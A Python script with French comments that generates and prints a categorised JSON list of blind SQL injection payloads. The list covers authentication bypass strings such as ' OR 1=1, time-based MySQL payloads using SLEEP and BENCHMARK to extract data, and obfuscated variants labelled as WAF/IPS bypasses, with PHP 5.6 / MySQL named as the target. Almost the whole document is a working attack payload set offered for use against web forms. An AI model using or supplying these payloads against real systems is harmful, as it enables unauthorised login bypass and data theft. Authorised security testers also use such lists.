# Script de génération de payloads SQL Blind
# Génère des ensembles complets de payloads pour injection SQL aveugle

payloads = {
    "boolean_true": [],
    "boolean_false": [],
    "time_based": [],
    "obfuscated": [],
    "metadata": {}
}

# 1. PAYLOADS BOOLEAN TRUE (Auth Bypass)
true_payloads = [
    # OR 1=1 basiques
    ("' OR 1=1-- ", "OR 1=1 avec commentaire --"),
    ("' OR 1=1#", "OR 1=1 avec commentaire #"),
    ("' OR 1=1/*", "OR 1=1 avec commentaire /* */"),
    ('" OR 1=1-- ', "Double quotes OR 1=1"),
    ("` OR 1=1-- ", "Backticks OR 1=1"),
    (") OR 1=1-- ", "Parenthèse OR 1=1"),
    ("') OR 1=1-- ", "Quote+parenthèse OR 1=1"),
    
    # Sans espaces
    ("'OR'1'='1", "Sans espaces OR 1=1"),
    ("'OR1=1--", "Collé OR1=1"),
    ('"OR"1"="1', "Collé double quotes"),
    
    # AND 1=1
    ("' AND 1=1-- ", "AND 1=1 pour validation"),
    ("' AND TRUE-- ", "AND TRUE"),
    
    # TRUE direct
    ("' OR TRUE-- ", "OR TRUE direct"),
    
    # SUBSTR/LENGTH pour extraction
    ("' OR SUBSTR(version(),1,1)='5'-- ", "SUBSTR extraction"),
    ("' OR LENGTH(database())>0-- ", "LENGTH > 0"),
    
    # LIKE
    ("' OR username LIKE '%'-- ", "LIKE joker"),
    
    # UNION SELECT
    ("' UNION SELECT 1,2,3-- ", "UNION SELECT numérique"),
    ("' UNION SELECT NULL,NULL-- ", "UNION SELECT NULL"),
    
    # IN/BETWEEN
    ("' OR 1 IN (1)-- ", "IN (1)"),
    ("' OR 1 BETWEEN 0 AND 2-- ", "BETWEEN 0 AND 2"),
    
    # Fonctions MySQL
    ("' OR @@version>0-- ", "@@version>0"),
    ("' OR VERSION()>0-- ", "VERSION()>0"),
    
    # Case
    ("' OR CASE WHEN 1=1 THEN 1 END-- ", "CASE WHEN 1=1"),
    
    # Encodés
    ("'%20OR%201=1-- ", "URL encode %20"),
    ("'%09OR%091=1%23", "Tab encode %09"),
    ("'%0aOR%0a1=1%00", "Newline encode %0a"),
    
    # RLIKE/REGEXP
    ("' OR 1 RLIKE 1-- ", "RLIKE 1"),
    
    # MySQL spécifique
    ("' OR 1=1;%00", "Terminator ;%00 null byte"),
    ("' OR 1=1;%23", "Terminator ;%23"),
]

# 2. PAYLOADS BOOLEAN FALSE (Contrôle)
false_payloads = [
    ("' OR 1=0-- ", "OR 1=0 basique"),
    ("' OR 1=0#", "OR 1=0 avec #"),
    ("' AND 1=0-- ", "AND 1=0"),
    ("' OR FALSE-- ", "OR FALSE"),
    ("' OR '1'='2'-- ", "String mismatch"),
    ('" OR "1"="2"', "Double quotes mismatch"),
    ("' OR NOT 1=1-- ", "NOT 1=1"),
    ("' OR SUBSTR(version(),1,1)='9'-- ", "SUBSTR faux"),
    ("' OR LENGTH(database())<0-- ", "LENGTH<0 impossible"),
]

# 3. PAYLOADS TIME-BASED (MySQL)
time_payloads = [
    ("' OR SLEEP(5)-- ", "SLEEP(5) simple"),
    ("' OR IF(1=1, SLEEP(5), 0)-- ", "IF(1=1, SLEEP(5))"),
    ("'; SELECT SLEEP(5)-- ", "Séparateur ; SELECT SLEEP"),
    ("' OR IF(LENGTH(database())>0, SLEEP(5), 0)-- ", "IF LENGTH>0"),
    ("' OR IF(SUBSTR(database(),1,1)='a', SLEEP(5), 0)-- ", "IF SUBSTR='a'"),
    ("' OR BENCHMARK(5000000,MD5('test'))-- ", "BENCHMARK MD5"),
    ("' OR IF(ASCII(SUBSTR(database(),1,1))>64, SLEEP(5), 0)-- ", "IF ASCII>64"),
    ("'ORIF(1=1,SLEEP(5),0)--", "Collé IF(SLEEP)"),
    ("'%20OR%20SLEEP(5)-- ", "URL encode SLEEP"),
]

# 4. TECHNIQUES D'OBFUSCATION
obfuscated_payloads = [
    # URL encoding
    ("%27%20OR%201%3D1--%20", "URL encode complet"),
    
    # Double URL encoding
    ("%2527%2520OR%25201%253D1%2523", "Double URL encode"),
    
    # Commentaires embarqués
    ("' OR/**/1=1-- ", "/**/ comment"),
    ("' /*!OR*/ 1=1-- ", "/*! MySQL comment */"),
    ("' O/**/R 1=1-- ", "O/**/R split"),
    
    # Fragments de mots-clés
    ("' selselectect version()-- ", "selselectect"),
    ("' uninselecton select-- ", "uninselecton"),
    
    # Concaténation CHAR
    ("' OR CHAR(79,82,32,49,61,49)-- ", "CHAR(79,82,49,61,49)"),
    
    # Casse mixte
    ("' Or 1=1-- ", "Or mixte"),
    ("' oR 1=1-- ", "oR mixte"),
    
    # Backticks
    ("`OR`1`=`1`-- ", "Backticks colles"),
    
    # Encodage hexadecimal
    ("' OR 0x313d31-- ", "Hex 0x313d31"),
    
    # Multiple encodage
    ("'%20%2f%2a%20OR%20%2a%2f%201%20%3d%201%20%2d%2d ", "%20%2f%2a multiple"),
]

# Construire la structure de sortie
for payload, desc in true_payloads:
    payloads["boolean_true"].append({
        "payload": payload,
        "description": desc,
        "technique": "boolean_true",
        "detection": "Auth réussie, contenu différent, pas d'erreur"
    })

for payload, desc in false_payloads:
    payloads["boolean_false"].append({
        "payload": payload,
        "description": desc,
        "technique": "boolean_false",
        "detection": "Auth échouée, message d'erreur attendu"
    })

for payload, desc in time_payloads:
    payloads["time_based"].append({
        "payload": payload,
        "description": desc,
        "technique": "time_based",
        "detection": "Délai réponse >5s différentiel"
    })

for payload, desc in obfuscated_payloads:
    payloads["obfuscated"].append({
        "payload": payload,
        "description": desc,
        "technique": "obfuscated",
        "detection": "WAF/IPS bypass"
    })

# Quotes styles supplémentaires
for quote in ["'", '"', "`", ""]:
    payloads["boolean_true"].append({
        "payload": f"{quote} OR 1=1-- ",
        "description": f"Quote style {repr(quote)}",
        "technique": "quote_variation",
        "detection": "Test délimiteurs"
    })

# Comment terminators supplémentaires
for term in ["-- ", "#", "/*", ";%00", "--\n", ";%23"]:
    payloads["boolean_true"].append({
        "payload": f"' OR 1=1{term}",
        "description": f"Terminator {repr(term)}",
        "technique": "terminator",
        "detection": "Test terminators"
    })

# Mettre à jour métadonnées
categories = {
    "boolean_true": len(payloads["boolean_true"]),
    "boolean_false": len(payloads["boolean_false"]),
    "time_based": len(payloads["time_based"]),
    "obfuscated": len(payloads["obfuscated"])
}
payloads["metadata"] = {
    "total_payloads": sum(categories.values()),
    "categories": categories,
    "target_environment": "PHP 5.6 / MySQL",
    "bypass_techniques": ["url_encoding", "double_encoding", "comment_bypass", "keyword_splitting", "case_variation", "char_encoding"]
}

# Affichage final
import json
print(json.dumps(payloads, indent=2, ensure_ascii=False))

# Résumé
print(f"\n{'='*70}")
print(f"TOTAL PAYLOADS: {payloads['metadata']['total_payloads']}")
print(f"✓ Boolean TRUE: {categories['boolean_true']}")
print(f"✓ Boolean FALSE: {categories['boolean_false']}")
print(f"✓ Time-based: {categories['time_based']}")
print(f"✓ Obfuscated: {categories['obfuscated']}")
print(f"{'='*70}")
print("\nUtilisation: Intégrer dans votre script de test de formulaire")

